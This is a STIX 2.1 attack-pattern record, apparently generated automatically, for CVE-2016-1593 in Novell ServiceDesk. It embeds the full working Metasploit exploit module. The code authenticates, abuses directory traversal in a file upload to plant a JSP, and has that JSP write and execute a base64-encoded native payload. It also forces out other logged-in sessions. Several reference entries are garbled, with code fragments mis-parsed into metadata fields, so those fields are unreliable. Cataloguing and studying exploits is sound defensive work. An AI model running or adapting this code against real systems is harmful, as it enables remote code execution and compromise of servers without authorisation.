{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d2f9f46-4141-4428-af9e-f13ae346b46b",
    "created": "2024-08-14T17:11:50.356726Z",
    "modified": "2024-08-14T17:11:50.35673Z",
    "name": "Novell ServiceDesk Authenticated File Upload",
    "description": " This module exploits an authenticated arbitrary file upload via directory traversal to execute code on the target. It has been tested on versions 6.5 and 7.1.0, in Windows and Linux installations of Novell ServiceDesk, as well as the Virtual Appliance provided by Novell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/novell_servicedesk_rce.rb",
            "external_id": "novell_servicedesk_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1593"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/novell-service-desk-7.1.0.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2016/Apr/64"
        },
        {
            "source_name": "fail_with(Failure::NoAccess",
            "external_id": "\"#{peer}-FailedtogettheloginURL.\")"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtogettheimportURL.\")"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtogettheimportURL.\")"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtogettheuploadURL.\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell ServiceDesk Authenticated File Upload',\n      'Description'    => %q{\n        This module exploits an authenticated arbitrary file upload via directory traversal\n        to execute code on the target. It has been tested on versions 6.5 and 7.1.0, in\n        Windows and Linux installations of Novell ServiceDesk, as well as the Virtual\n        Appliance provided by Novell.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2016-1593' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/novell-service-desk-7.1.0.txt' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2016/Apr/64' ]\n        ],\n      'Platform'    => %w{ linux win },\n      'Arch'           => ARCH_X86,\n      'DefaultOptions' => { 'WfsDelay' => 15 },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Novell ServiceDesk / Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Novell ServiceDesk / Windows',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n        ],\n      'Privileged'     => false,  # Privileged on Windows but not on (most) Linux targets\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2016-03-30'\n    ))\n\n    register_options(\n      [\n        OptPort.new('RPORT',\n          [true, 'The target port', 80]),\n        OptString.new('USERNAME',\n          [true, 'The username to login as', 'admin']),\n        OptString.new('PASSWORD',\n          [true, 'Password for the specified username', 'admin']),\n        OptString.new('TRAVERSAL_PATH',\n          [false, 'Traversal path to tomcat/webapps/LiveTime/'])\n      ])\n  end\n\n\n  def get_version\n    res = send_request_cgi({\n      'uri'    => normalize_uri('LiveTime','WebObjects','LiveTime.woa'),\n      'method' => 'GET',\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',\n      }\n    })\n\n    if res && res.code == 200 && res.body.to_s =~ /\\<p class\\=\\\"login-version-title\\\"\\>\\Version \\#([0-9\\.]+)\\<\\/p\\>/\n      return $1.to_f\n    else\n      return 999\n    end\n  end\n\n\n  def check\n    version = get_version\n    if version <= 7.1 && version >= 6.5\n      return Exploit::CheckCode::Appears\n    elsif version > 7.1\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n\n  def pick_target\n    return target if target.name != 'Automatic'\n\n    print_status(\"#{peer} - Determining target\")\n\n    os_finder_payload = %Q{<html><body><%out.println(System.getProperty(\"os.name\"));%></body><html>}\n\n    traversal_paths = []\n    if datastore['TRAVERSAL_PATH']\n      traversal_paths << datastore['TRAVERSAL_PATH']    # add user specified or default Virtual Appliance path\n    end\n\n    # add Virtual Appliance path plus the traversal in a Windows or Linux self install\n    traversal_paths.concat(['../../srv/tomcat6/webapps/LiveTime/','../../Server/webapps/LiveTime/'])\n\n    # test each path to determine OS (and correct path)\n    traversal_paths.each do |traversal_path|\n      jsp_name = upload_jsp(traversal_path, os_finder_payload)\n\n      res = send_request_cgi({\n        'uri'    => normalize_uri('LiveTime', jsp_name),\n        'method' => 'GET',\n        'headers' => {\n          'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',\n        },\n        'cookie' => @cookies\n      })\n\n      if res && res.code == 200\n        if res.body.to_s =~ /Windows/\n          @my_target = targets[2]\n        else\n          # Linux here\n          @my_target = targets[1]\n        end\n        if traversal_path.include? '/srv/tomcat6/webapps/'\n          register_files_for_cleanup('/srv/tomcat6/webapps/LiveTime/' + jsp_name)\n        else\n          register_files_for_cleanup('../webapps/LiveTime/' + jsp_name)\n        end\n        return traversal_path\n      end\n    end\n\n    return nil\n  end\n\n\n  def upload_jsp(traversal_path, jsp)\n    jsp_name  = Rex::Text.rand_text_alpha(6+rand(8)) + \".jsp\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(jsp, \"application/octet-stream\", 'binary', \"form-data; name=\\\"#{@upload_form}\\\"; filename=\\\"#{traversal_path}#{jsp_name}\\\"\")\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(@upload_url),\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',\n      },\n      'cookie' => @cookies,\n      'data'   => data,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    if not res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Failed to upload payload...\")\n    else\n      return jsp_name\n    end\n  end\n\n\n  def create_jsp\n    opts = {:arch => @my_target.arch, :platform => @my_target.platform}\n    payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)\n    exe = generate_payload_exe(opts)\n    base64_exe = Rex::Text.encode_base64(exe)\n\n    native_payload_name = rand_text_alpha(rand(6)+3)\n    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'\n\n    var_raw     = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_ostream = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_buf     = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_decoder = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_tmp     = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_path    = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_proc2   = Rex::Text.rand_text_alpha(rand(8) + 3)\n\n    if @my_target['Platform'] == 'linux'\n      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      chmod = %Q|\n      Process #{var_proc1} = Runtime.getRuntime().exec(\"chmod 777 \" + #{var_path});\n      Thread.sleep(200);\n      |\n\n      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      cleanup = %Q|\n      Thread.sleep(200);\n      Process #{var_proc3} = Runtime.getRuntime().exec(\"rm \" + #{var_path});\n      |\n    else\n      chmod = ''\n      cleanup = ''\n    end\n\n    jsp = %Q|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    try {\n      String #{var_buf} = \"#{base64_exe}\";\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{native_payload_name}\", \"#{ext}\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      #{chmod}\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n      #{cleanup}\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp = jsp.gsub(/\\n/, '')\n    jsp = jsp.gsub(/\\t/, '')\n    jsp = jsp.gsub(/\\x0d\\x0a/, \"\")\n    jsp = jsp.gsub(/\\x0a/, \"\")\n\n    return jsp\n  end\n\n\n  def exploit\n    version = get_version\n\n    # 1: get the cookies, the login_url and the password_form and username form names (they varies between versions)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/LiveTime/WebObjects/LiveTime.woa'),\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',\n      }\n    })\n\n    if res && res.code == 200 && res.body.to_s =~ /class\\=\\\"login\\-form\\\"(.*)action\\=\\\"([\\w\\/\\.]+)(\\;jsessionid\\=)*/\n      login_url = $2\n      @cookies = res.get_cookies\n      if res.body.to_s =~ /type\\=\\\"password\\\" name\\=\\\"([\\w\\.]+)\\\" \\/\\>/\n        password_form = $1\n      else\n        # we shouldn't hit this condition at all, this is default for v7+\n        password_form = 'password'\n      end\n      if res.body.to_s =~ /type\\=\\\"text\\\" name\\=\\\"([\\w\\.]+)\\\" \\/\\>/\n        username_form = $1\n      else\n        # we shouldn't hit this condition at all, this is default for v7+\n        username_form = 'username'\n      end\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to get the login URL.\")\n    end\n\n    # 2: authenticate and get the import_url\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(login_url),\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',\n      },\n      'cookie' => @cookies,\n      'vars_post' => {\n        username_form => datastore['USERNAME'],\n        password_form => datastore['PASSWORD'],\n        'ButtonLogin' => 'Login'\n      }\n    })\n\n    if res && res.code == 200 &&\n      (res.body.to_s =~ /id\\=\\\"clientListForm\\\" action\\=\\\"([\\w\\/\\.]+)\\\"\\>/ || # v7 and above\n      res.body.to_s =~ /\\<form method\\=\\\"post\\\" action\\=\\\"([\\w\\/\\.]+)\\\"\\>/)   # v6.5\n      import_url = $1\n    else\n      # hmm either the password is wrong or someone else is using \"our\" account.. .\n      # let's try to boot him out\n      if res && res.code == 200 && res.body.to_s =~ /class\\=\\\"login\\-form\\\"(.*)action\\=\\\"([\\w\\/\\.]+)(\\;jsessionid\\=)*/ &&\n        res.body.to_s =~ /This account is in use on another system/\n\n        res = send_request_cgi({\n          'method' => 'POST',\n          'uri' => normalize_uri(login_url),\n          'headers' => {\n            'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',\n          },\n          'cookie' => @cookies,\n          'vars_post' => {\n            username_form => datastore['USERNAME'],\n            password_form => datastore['PASSWORD'],\n            'ButtonLoginOverride' => 'Login'\n          }\n        })\n        if res && res.code == 200 &&\n          (res.body.to_s =~ /id\\=\\\"clientListForm\\\" action\\=\\\"([\\w\\/\\.]+)\\\"\\>/ || # v7 and above\n          res.body.to_s =~ /\\<form method\\=\\\"post\\\" action\\=\\\"([\\w\\/\\.]+)\\\"\\>/)   # v6.5\n          import_url = $1\n        else\n          fail_with(Failure::Unknown, \"#{peer} - Failed to get the import URL.\")\n        end\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Failed to get the import URL.\")\n      end\n    end\n\n    # 3: get the upload_url\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(import_url),\n      'headers' => {\n        'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',\n      },\n      'cookie' => @cookies,\n      'vars_post' => {\n        'ButtonImport' => 'Import'\n      }\n    })\n\n    if res && res.code == 200 &&\n      (res.body.to_s =~ /id\\=\\\"clientImportUploadForm\\\" action\\=\\\"([\\w\\/\\.]+)\\\"\\>/ ||                         # v7 and above\n      res.body.to_s =~ /\\<form method\\=\\\"post\\\" enctype\\=\\\"multipart\\/form-data\\\" action\\=\\\"([\\w\\/\\.]+)\\\"\\>/) # v6.5\n      @upload_url = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to get the upload URL.\")\n    end\n\n    if res.body.to_s =~ /\\<input type\\=\\\"file\\\" name\\=\\\"([0-9\\.]+)\\\" \\/\\>/\n      @upload_form = $1\n    else\n      # go with the default for 7.1.0, might not work with other versions...\n      @upload_form = \"0.53.19.0.2.7.0.3.0.0.1.1.1.4.0.0.23\"\n    end\n\n    # 4: target selection\n    @my_target = nil\n    # pick_target returns the traversal_path and sets @my_target\n    traversal_path = pick_target\n    if @my_target.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Unable to select a target, we must bail.\")\n    else\n      print_status(\"#{peer} - Selected target #{@my_target.name} with traversal path #{traversal_path}\")\n    end\n\n    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.\n    # Fail if this is the case and ask the user to select an appropriate payload.\n    if @my_target['Platform'] == 'linux' && payload_instance.name =~ /Windows/\n      fail_with(Failure::BadConfig, \"#{peer} - Select a compatible payload for this Linux target.\")\n    end\n\n    # 5: generate the JSP with the payload\n    jsp = create_jsp\n    print_status(\"#{peer} - Uploading payload...\")\n    jsp_name = upload_jsp(traversal_path, jsp)\n    if traversal_path.include? '/srv/tomcat6/webapps/'\n      register_files_for_cleanup('/srv/tomcat6/webapps/LiveTime/' + jsp_name)\n    else\n      register_files_for_cleanup('../webapps/LiveTime/' + jsp_name)\n    end\n\n    # 6: pwn it!\n    print_status(\"#{peer} - Requesting #{jsp_name}\")\n    send_request_raw({'uri' => normalize_uri('LiveTime', jsp_name)})\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-30",
    "x_mitre_platforms": [
        "win'"
    ]
}